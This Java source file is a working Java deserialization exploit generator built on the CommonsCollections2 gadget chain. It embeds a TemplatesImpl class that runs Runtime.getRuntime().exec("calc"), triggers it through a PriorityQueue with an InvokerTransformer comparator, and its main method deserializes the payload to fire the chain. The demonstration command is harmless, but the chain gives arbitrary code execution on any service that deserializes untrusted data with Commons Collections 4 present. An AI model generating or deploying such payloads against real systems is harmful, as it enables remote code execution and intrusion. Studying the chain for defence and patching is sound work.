package org.payload.cc.CC2;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.PriorityQueue;

import static org.Tools.setClassPool.*;
import static org.Tools.setFieldValue.setFieldValue;
import static org.Tools.setSerial.serial;
import static org.Tools.setTemplatesImpl.template;

public class CommonsCollections2TemplatesImpl {
    public static byte[] CommonsCollections2TemplatesImpl() throws Exception{
        //byte[] evilClass = evilClass1("org.Tools.Evil");
        byte[] evilClass = evilClass2("java.lang.Runtime.getRuntime().exec(\"calc\");");
        TemplatesImpl template = template(evilClass);

        InvokerTransformer transformer = new InvokerTransformer("toString", null, null);
        TransformingComparator comparator =  new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformer, "iMethodName", "newTransformer");
        setFieldValue(queue, "queue", new Object[]{template,2});
        return serial(queue);
    }

    public static void main(String[] args) throws Exception {
        byte[] barr = CommonsCollections2TemplatesImpl();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr));
        ois.readObject();
    }

}